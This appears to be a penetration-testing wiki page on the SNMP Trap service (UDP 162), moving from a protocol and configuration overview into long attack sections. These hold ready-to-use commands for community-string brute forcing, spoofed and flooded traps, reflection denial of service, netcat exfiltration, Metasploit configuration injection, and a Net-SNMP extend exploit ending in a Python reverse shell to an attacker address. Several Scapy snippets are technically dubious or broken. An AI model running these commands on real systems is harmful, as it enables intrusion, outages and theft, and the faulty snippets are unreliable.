# P162 SNMP Trap

## Index

* \[\[Ports, Protocols, and Services]]
  * \[\[P161 SNMP]]

## Simple Network Management Protocol (SNMP) Trap

* **Port Number:** 162 (UDP)
* **Protocol:** UDP
* **Service Name:** SNMP Trap
* **Defined in:** RFC 1157 (SNMPv1), RFC 1905 (SNMPv2c), RFC 3416 (SNMPv3)

The SNMP Trap Protocol is a component of the Simple Network Management Protocol (SNMP) that allows network devices to send unsolicited notifications (known as "traps") to a network management system (NMS). These traps are alerts generated by agents on managed devices (like routers, switches, or servers) when specific events or thresholds are met. SNMP traps are sent via UDP on port 162 to a pre-configured NMS or SNMP manager.

### Overview of Features

* **Asynchronous Notification:** SNMP traps are sent in real-time as events occur, enabling immediate alerting of network administrators.
* **Stateless Protocol:** Operates over UDP, meaning traps are sent without requiring a prior connection to the NMS.
* **Support for Multiple Versions:** SNMP traps are supported across different versions of SNMP (v1, v2c, and v3), with v3 providing added security features like encryption and authentication.
* **Minimal Overhead:** Due to the use of UDP, SNMP traps impose minimal overhead on the network, making them efficient for sending quick notifications.
* **Customizable Alerts:** Devices can be configured to send traps based on a wide variety of conditions, such as threshold breaches, status changes, or error conditions.

### Typical Use Cases

* **Network Monitoring:** SNMP traps are integral to network monitoring systems, allowing administrators to receive alerts about critical issues such as link failures, high CPU utilization, or memory leaks.
* **Performance Management:** Traps can be used to monitor performance metrics and trigger alerts when certain performance thresholds are exceeded.
* **Security Monitoring:** SNMP traps can notify administrators of potential security incidents, such as unauthorized access attempts or configuration changes.
* **Device Health Monitoring:** Devices can send traps to report their health status, such as power supply issues or hardware failures.

### How SNMP Trap Protocol Works

1. **Configuration of SNMP Agent:**
   * **Step 1:** Network devices (like routers or switches) are configured with SNMP agents that monitor specific parameters or events.
   * **Step 2:** The SNMP agent is set up to send traps to a predefined NMS or SNMP manager whenever specific conditions are met.
2. **Event Detection:**
   * **Step 3:** The SNMP agent on the device monitors various metrics (e.g., CPU usage, interface status, etc.).
   * **Step 4:** When a monitored condition meets a predefined threshold (e.g., CPU usage exceeds 90%), the SNMP agent generates a trap.
3. **Trap Generation:**
   * **Step 5:** The SNMP agent constructs a trap message, which includes details such as the trap type, object identifiers (OIDs), and relevant data about the event.
   * **Step 6:** The trap message is sent to the NMS via UDP on port 162.
4. **Trap Reception:**
   * **Step 7:** The NMS listens on UDP port 162 for incoming trap messages.
   * **Step 8:** Upon receiving a trap, the NMS processes the message and can trigger alerts, log the event, or execute predefined actions based on the trap's content.
5. **NMS Response** (Optional):
   * **Step 9:** Depending on the configuration, the NMS may send a response (typically using SNMP Get or Set requests) to query additional information from the device that generated the trap.

#### Diagram (Hypothetical Example)

* **Device:** `<target_ip>` detects an event (e.g., link down).
* **SNMP Agent:** Generates a trap message with details about the event.
* **NMS:** `<attack_ip>` receives the trap on UDP port 162, logs the event, and sends a query to `<target_ip>` for further details.

## Additional Information

### SNMP Trap Example

An example of an SNMP trap might include the following information:

**Source IP:** The IP address of the device sending the trap. **Trap Type:** The type of event that occurred. **Timestamp:** When the event occurred. **Object Identifier (OID):** Identifies the specific MIB object related to the event. **Event Description:** A description of the event.

### SNMP Trap Types

| **Trap Type**          | **Description**                                                                                             |
| ---------------------- | ----------------------------------------------------------------------------------------------------------- |
| Cold Start             | The agent is reinitializing and its configuration may have changed.                                         |
| Warm Start             | The agent is reinitializing but its configuration has not changed.                                          |
| Link Down              | An interface has gone down.                                                                                 |
| Link Up                | An interface has come up.                                                                                   |
| Authentication Failure | An unauthorized SNMP message has been received.                                                             |
| EGP Neighbor Loss      | An Exterior Gateway Protocol (EGP) neighbor for which the agent was configured has been marked unreachable. |
| Enterprise-Specific    | Specific conditions defined by the enterprise using the agent.                                              |

### Security Considerations

* **Lack of Reliability:** Since SNMP traps are sent over UDP, there is no guarantee of delivery. If the trap is lost in transit, the NMS will not receive the alert.
* **Security Risks:** SNMPv1 and SNMPv2c traps are sent in plaintext, making them vulnerable to eavesdropping and replay attacks. SNMPv3 introduces encryption and authentication to mitigate these risks.
* **Trap Storms:** A misconfigured device can flood the NMS with traps (known as a trap storm), overwhelming the management system and potentially leading to denial of service conditions.

### Alternatives

* **Syslog:** An alternative for logging and alerting is the Syslog protocol, which provides more detailed logging capabilities and supports both UDP and TCP.
* **SNMP Polling:** Instead of waiting for traps, the NMS can actively poll devices for status information using SNMP Get requests. This provides more control but adds overhead.

### Advanced Usage

* **SNMP Inform Requests:** Unlike traps, Inform requests provide a more reliable notification mechanism by requiring an acknowledgment from the NMS. If the acknowledgment is not received, the agent can retransmit the Inform request.

### Modes of Operation

* **Broadcast Mode:** In some environments, SNMP traps can be sent to multiple NMS instances simultaneously, ensuring that alerts are received even if one NMS is down.

### Configuration Files

SNMP trap configuration typically involves setting up the SNMP agent on the network device and configuring the NMS to listen for traps. Here’s a breakdown of typical configuration files:

1. **snmpd.conf (SNMP Agent Configuration):**

* **File Location:** `/etc/snmp/snmpd.conf`
*   **Configuration Example:**

    ```bash
    trap2sink <nms_ip> public
    trapsink <nms_ip> public
    ```
* **Key Settings:**
  * `trapsink`: Defines the IP address of the NMS to which traps are sent.
  * `trap2sink`: Similar to `trapsink`, but specific to SNMPv2c.
  * `public`: The community string, which acts as a password in SNMPv1 and SNMPv2c.

2. **snmptrapd.conf (SNMP Trap Daemon Configuration):**

* **File Location:** `/etc/snmp/snmptrapd.conf`
*   **Configuration Example:**

    ```bash
    authCommunity log,execute,net public
    traphandle default /usr/sbin/snmptthandler
    ```
* **Key Settings:**
  * `authCommunity`: Specifies the community string and permissions.
  * `traphandle`: Defines the handler script or command to execute upon receiving a trap.

### Potential Misconfigurations

1. **Unrestricted SNMP Trap Reception:**
   * **Risk:** If the NMS is configured to accept traps from any source without proper filtering, it can be overwhelmed by traps from unauthorized or malicious devices.
   * **Exploitation:** Attackers can flood the NMS with bogus traps, leading to log file saturation or resource exhaustion.
2. **Weak Community Strings:**
   * **Risk:** Using default or weak community strings (e.g., "public") makes it easy for attackers to spoof traps or intercept legitimate traps.
   * **Exploitation:** An attacker can send fake traps to the NMS, misleading administrators or triggering false alarms.
3. **Lack of Authentication and Encryption (SNMPv1/v2c):**
   * **Risk:** SNMPv1 and SNMPv2c traps are sent in plaintext, making them vulnerable to interception and replay attacks.
   * **Exploitation:** An attacker can capture traps, modify them, and replay them to the NMS, potentially causing incorrect actions to be taken.

### Default Credentials

SNMP traps in SNMPv1 and SNMPv2c use a community string for authentication, which is often set to "public" by default. This is a significant security risk and should be changed to a more secure value.

| **Protocol Version** | **Default Community String** |
| -------------------- | ---------------------------- |
| SNMPv1               | public                       |
| SNMPv2c              | public                       |

## Interaction and Tools

### Tools

#### \[\[SNMPWalk]]

*   **Retrieve a subtree of management values:** Retrieves a subtree of the MIB, starting from a specified OID.

    ```bash
    snmpwalk -v <snmp_version> -c <community_string> <target_ip> <oid>
    ```
*   **Get IPv6, needed dec2hex:**

    ```bash
    snmpwalk -v <snmp_version> -c <community_string> <target_ip> 1.3.6.1.2.1.4.34.1.3 
    ```
*   **Get extended:**

    ```bash
    snmpwalk -v <snmp_version> -c <community_string> <target_ip> NET-SNMP-EXTEND-MIB::nsExtendObjects
    ```

#### \[\[SNMPBulkWalk]]

*   **Bulk SNMP Query:** Retrieves large amounts of information from a target using a single SNMP request. Don't forget the final dot.

    ```bash
    snmpbulkwalk -v <snmp_version> -c <community_string> <target_ip> . 
    ```

#### \[\[SNMPGet]]

*   **Retrieve the value of a specific OID:**

    ```bash
    snmpget -v <snmp_version> -c <community_string> <target_ip> <oid>
    ```
*   **Get system description:**

    ```bash
    snmpget -v <snmp_version> -c <community_string> <target_ip> .1.3.6.1.2.1.1.1.0
    ```
*   **Get system uptime:** Fetch the system uptime from a network device.

    ```bash
    snmpget -v <snmp_version> -c <community_string> <target_ip> .1.3.6.1.2.1.1.3.0
    ```
*   **SNMPv3 Command with Authentication:** Retrieves data using SNMPv3 with both authentication and encryption.

    ```bash
    snmpget -v 3 -u admin -a MD5 -A authpass -x DES -X privpass -l authPriv <target_ip> .1.3.6.1.2.1.1.1.0
    ```

#### \[\[SNMPSet]]

*   **Set the value of a specific OID:** Sets a new value for a specific OID on the target device.

    ```bash
    snmpset -v <snmp_version> -c <community_string> <target_ip> .1.3.6.1.2.1.1.5.0 s "New Device Name"
    ```

#### \[\[SNMPTrap]]

*   **Send a trap to an SNMP manager:** Sending a test trap to an SNMP manager for monitoring purposes.

    ```bash
    snmptrap -v <snmp_version> -c <community_string> <target_ip> '' .1.3.6.1.2.1.1.6.0
    ```

    ```bash
    snmptrap -v <snmp_version> -c <community_string> <manager_ip> "" .1.3.6.1.4.1.8072.2.3.0.1
    ```
*   **Sending a Test Trap (SNMPv1):** Sends a simple SNMPv1 trap to the specified NMS.

    ```bash
    snmptrap -v 1 -c <community_string> <nms_ip> "" <oid> s "Test message"
    ```
*   **Sending a Test Trap (SNMPv2c):** Sends a simple SNMPv2c trap to the specified NMS.

    ```bash
    snmptrap -v 2c -c <community_string> <nms_ip> "" <oid> s "Test message"
    ```
*   **Sending a Test Trap (SNMPv3):** Sends a secure SNMPv3 trap using authentication and encryption.

    ```bash
    snmptrap -v 3 -u <username> -l authPriv -a MD5 -A mypassword -x DES -X myprivpassword <nms_ip> "" <oid> s "Test message"
    ```
*   **Sending a Trap with Custom OIDs:** Sends a trap with multiple OIDs, each representing different pieces of information.

    ```bash
    snmptrap -v 2c -c public <nms_ip> "" <oid1> s "Value1" <oid2> i 123
    ```

#### \[\[SNMPTrapd]]

*   **SNMP Trap Receiver:** Runs a daemon to listen for SNMP traps in real-time.

    ```bash
    snmptrapd -f -Lo
    ```
*   **Filtering Traps Based on OIDs:** Filters incoming traps to only display those that match a specific OID.

    ```bash
    snmptrapd -On -f | grep <oid>
    ```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "udp port 162"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 162
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 162
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 162 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 162
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 162 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **Socat TCP Connect:** Simple tests to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:162
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send UDP Packet:** Send a single UDP packet to the service.

    ```bash
    hping3 -2 <target_ip> -p 162 -c 1
    ```

#### \[\[Scapy]]

*   **Custom Code:** Sending highly customized SNMP traps for testing or exploitation.

    ```python
    from scapy.all import *
    trap = SNMPv2Trap(
        community='public',
        varbindlist=[SNMPvarbind(oid='1.3.6.1.2.1.1.1.0', value='Test Trap')]
    )
    send(trap, iface='eth0')
    ```

### Other Techniques

#### SNMP via Email Clients

* **Description:** Leverage GUI email clients to access SNMP.
  * **\[\[Evolution]]**
  * **\[\[Thunderbird]]**
  * **\[\[Microsoft Outlook]]**

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 162
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 162
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

#### SNMP Enumeration

*   **Tool:** \[\[SNMPWalk]]

    ```bash
    snmpwalk -v <snmp_version> -c <community_string> <target_ip>
    ```
* **Description:** Enumerates the SNMP service to gather detailed information about the target device.

#### Community String Brute Force

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 161 -sU --script=snmp-brute 
    ```

\


*   **Tool:** \[\[OneSixtyOne]]

    ```bash
    onesixtyone -c <path/to/wordlist> <target_ip>
    ```

    \

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra -P /path/to/wordlist.txt snmp://<target_ip>
    ```
* **Description:** Attempt to brute force SNMP community strings, potentially gaining control over SNMP trap configurations.

### Persistence

#### Configuring Persistent SNMP Traps

*   **Tool:** \[\[SNMPTrap]]

    ```bash
    echo "trap2sink <manager_ip> <community_string>" >> /etc/snmp/snmpd.conf
    ```
* **Description:** Adds a persistent configuration to send traps to a specific manager.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "udp port 162"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

### Privilege Escalation

#### Manipulating SNMP Configuration via Traps

*   **Tool:** \[\[Scapy]]

    ```python
    send(IP(src="<target_ip>")/UDP(dport=162)/SNMPv2Trap(community='private', varbindlist=[SNMPvarbind(oid='1.3.6.1.4.1.2021.11.50.0', value=1)]))
    ```
* **Description:** Sending a crafted trap to escalate privileges by altering the SNMP configuration on the target device.

#### Buffer Overflow in SNMP Managers

*   **Tool:** \[\[Scapy]]

    ```python
    send(IP(dst="<manager_ip>")/UDP(dport=162)/SNMP()/"A"*1024)
    ```
* **Description:** Exploit a buffer overflow vulnerability in an SNMP manager by sending an oversized SNMP trap message.

### Defense Evasion

#### Misdirection with Spoofed Traps

*   **Tool:** \[\[Scapy]]

    ```python
    send(IP(src="<legitimate_device_ip>")/UDP(dport=162)/SNMPv2Trap(community='public', varbindlist=[SNMPvarbind(oid='1.3.6.1.4.1.2021.11.50.0', value=0)]))
    ```

    ```python
    send(IP(dst="<manager_ip>", src="<spoofed_ip>")/UDP(dport=162)/SNMP())
    ```
* **Description:** Sending spoofed traps to mislead network administrators and create false alarms, while diverting attention from actual malicious activity.

#### Hiding in SNMP Trap Storms

*   **Tool:** \[\[SNMPTrap]]

    ```bash
    for i in {1..1000}; do snmptrap -v2c -c public <manager_ip> "" .1.3.6.1.2.1.1.3.0 .1.3.6.1.4.1.8072.2.3.0.1; done
    ```
* **Description:** Flood the SNMP manager with traps to obscure malicious activity or distract administrators.

### Data Exfiltration

#### Exfiltrating Data via SNMP Traps

*   **Tool:** \[\[Scapy]]

    ```python
    send(IP(dst="<nms_ip>")/UDP(dport=162)/SNMPv2Trap(community='public', varbindlist=[SNMPvarbind(oid='1.3.6.1.4.1.2021.11.50.0', value='Exfiltrated Data')]))
    ```
* **Description:** Use SNMP traps to send encoded data to an external NMS, effectively exfiltrating data from the network.

## Exploits and Attacks

### Password Attacks

#### Brute-Forcing SNMPv3 Credentials

*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/scanner/snmp/snmp_login
    set RHOSTS <target_ip>
    set VERSION 3
    set USERNAME snmpv3user
    set PASS_FILE /path/to/password_list.txt
    run
    ```
* **Description:** Attempts to brute-force SNMPv3 credentials to gain unauthorized access.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### SNMP Trap Storm

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    while true; do snmptrap -v 2c -c public <nms_ip> "" <oid> s "Flood"; done
    ```

    ```bash
    for i in {1..10000}; do
      snmptrap -v <snmp_version> -c public <NMS_IP> '' .1.3.6.1.4.1.8072.2.3.0.1
    done	
    ```
* **Description:** Overloading the NMS with a flood of traps, causing it to crash or become unresponsive.

#### SNMPS Amplification Attack

*   **Tool:** \[\[Scapy]]

    ```python
    send(IP(src="<spoofed_ip>", dst="<nms_ip>")/UDP(dport=162)/SNMPv2Trap(community='public', varbindlist=[SNMPvarbind(oid='1.3.6.1.4.1.2021.11.50.0', value=0)]))
    ```
* **Description:** Using SNMP traps to amplify traffic towards a target by spoofing the source IP address, leading to a denial-of-service condition.

### Exploits

#### SNMPv3 Authentication Bypass

*   **Tool:** \[\[Scapy]]

    ```python
    send(IP(dst="<nms_ip>")/UDP(dport=162)/SNMPv3(community='private', authKey='badkey', privKey='badkey', varbindlist=[SNMPvarbind(oid='1.3.6.1.4.1.2021.11.50.0', value='Bypass')]))
    ```
* **Description:** Exploiting weak or misconfigured authentication settings in SNMPv3 to bypass security controls.

#### SNMP Trap Injection

*   **Tool:** \[\[Scapy]]

    ```python
    send(IP(dst="<nms_ip>")/UDP(dport=162)/SNMPv2Trap(community='public', varbindlist=[SNMPvarbind(oid='1.3.6.1.4.1.2021.11.50.0', value='Malicious Data')]))
    ```
* **Description:** Crafting and injecting malicious SNMP traps to exploit vulnerabilities in the NMS or trigger unwanted actions.

#### SNMP Configuration Injection

* **Tool:** \[\[SNMPSet]]

```bash
    snmpset -v <snmp_version> -c <community_string> <target_ip> .1.3.6.1.2.1.1.6.0 s "Privileged Access"
```

\


*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/admin/snmp/snmp_set
    set RHOSTS <target_ip>
    set COMMUNITY private
    set OID 1.3.6.1.4.1.9.9.96.1.1.1.1.14.1.1
    set VALUE "malicious_config"
    run
    ```
* **Description:** Injects malicious configurations into SNMP-enabled devices, potentially leading to further exploitation or persistent access.

#### Remote Code Execution

SNMP is sometimes overseen by the administrator of the device or server where it is left in a default configuration. SNMP community with write permissions (`rwcommunity`) on the Linux operating system can be abused to let the attacker execute a command on the server.

*   **Extending Services:** While you are not able to modify existing entries that were configured in `snmpd.conf`, it is possible to add additional commands over SNMP, because the `MAX-ACCESS` permission setting in the MIB definition is set to `read-create`. Adding a new command basically works by appending an additional row to the `nsExtendObjects` table.

    ```bash
    snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
    'nsExtendStatus."evilcommand"' = createAndGo \
    'nsExtendCommand."evilcommand"' = /bin/echo \
    'nsExtendArgs."evilcommand"' = 'hello world'
    ```

    Injecting a command to run on the SNMP service. `NET-SNMP-EXTEND-MIB` requires that you always provide the absolute path to the executable. The called binary/script must also exist and be executable.
*   **Execute The Injected Command:** Execute the command that we injected to the SNMP by enumerating it using snmpwalk.

    ```bash
    snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
    ```
*   **Gain a Shell from Net-SNMP Extend:** In this section, I would like to discuss how to gain a server shell to control the server. You can use python script developed by mxrch that can be downloaded from [Github - SNMP-Shell](https://github.com/mxrch/snmp-shell.git). To install the pre-requisites to run:

    ```bash
    sudo apt install snmp snmp-mibs-downloader rlwrap -y
    git clone https://github.com/mxrch/snmp-shell
    cd snmp-shell
    sudo python3 -m pip install -r requirements.txt
    ```
*   **Creating Reverse Shell:** You can also create reverse shell manually by injecting the command below into the SNMP.

    ```bash
    snmpset -m +NET-SNMP-EXTEND-MIB -v <snmp_version> -c <community_string> <target_ip> 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"<attack_ip>\",<attack_port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
    ```

## Resources

| **Website**             | **URL**                                             |
| ----------------------- | --------------------------------------------------- |
| RFC 1157 (SNMPv1)       | https://tools.ietf.org/html/rfc1157                 |
| RFC 1905 (SNMPv2c)      | https://tools.ietf.org/html/rfc1905                 |
| RFC 3416 (SNMPv3)       | https://tools.ietf.org/html/rfc3416                 |
| Net-SNMP Documentation  | https://www.net-snmp.org/docs/man/                  |
| Wireshark User Guide    | https://www.wireshark.org/docs/wsug\_html\_chunked/ |
| Scapy Documentation     | https://scapy.readthedocs.io/en/latest/             |
| SNMPsoft TrapGen        | https://www.snmpsoft.com/trapgen/                   |
| Linux man-pages         | https://man7.org/linux/man-pages/                   |
| Nmap Documentation      | https://nmap.org/book/man-briefoptions.html         |
| Hydra GitHub Repository | https://github.com/vanhauser-thc/thc-hydra          |
